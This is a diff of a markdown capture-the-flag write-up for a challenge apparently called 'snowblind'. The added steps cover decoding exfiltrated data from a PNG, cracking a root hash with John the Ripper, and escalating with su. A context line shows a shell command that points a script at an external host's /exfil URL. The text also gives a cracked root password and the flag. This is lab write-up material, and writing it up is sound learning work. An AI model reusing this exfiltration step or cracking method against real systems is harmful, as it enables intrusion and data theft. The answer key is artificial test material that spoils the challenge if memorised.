@@ -162,31 +162,34 @@ The following command was issued in the shell as www-data to trigger the data ex
 echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
 ```
 
-Step Five:  Decode PNG file : Leak Sensitive Information
-Step Six: Crack Hash for Root : Weak Password 
-Step Seven: Escalate privileges : Escalate privileges
-Step by step solution complete with any code used
+The exfiltrated data file is located here: [Exfiltrated File](/resources/shadow_exfil.png)
+
+##Step Five:  Decode PNG file : Leak Sensitive Information
+
+Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.
+
+Using this script to decode: [PNG Decoder Script](/resources/snowblind_decodepng3.py)
+
+The file was damaged or incomplete, so the script suppresses errors and forces the data to be extracted. The backup script indicates that the data is exfiltrated is stored in the Blue channel of the file. The other channels can be ignored. Running the script reveals the exfiltrated data stored in the file.
+
+![Decoded PNG File](/images/snowblind_decodedpng.jpg) 
+
+##Step Six: Crack Hash for Root : Weak Password 
+
+With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.
+
+![John the Ripper](/images/snowblind_johntheripper.jpg) 
+
+**root password: jollyboy**
+
+##Step Seven: Escalate privileges : Escalate privileges
+
+With root password, it is a simple matter to escalate privileges using the su command. Once root, there is a bash script in the /root directory. Executing the script reveals the flag.
   
-![Sample image alt text](/images/objectivename_purpose.jpg) 
+![Privilege Escalation](/images/snowblind_privilege_escalation.jpg) 
 
 
-```sh
-bash script code block
-```
-
-Ordered list:
-1. Item 1
-2. Item 2
-3. Item 3
-
-Unordered list:
-
-- Item
-- Item
-- Item
-/usr/local/weather/temperature
-
-**Answer: Flag or Answer**
+**Answer: hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}**
 
 </details>
 
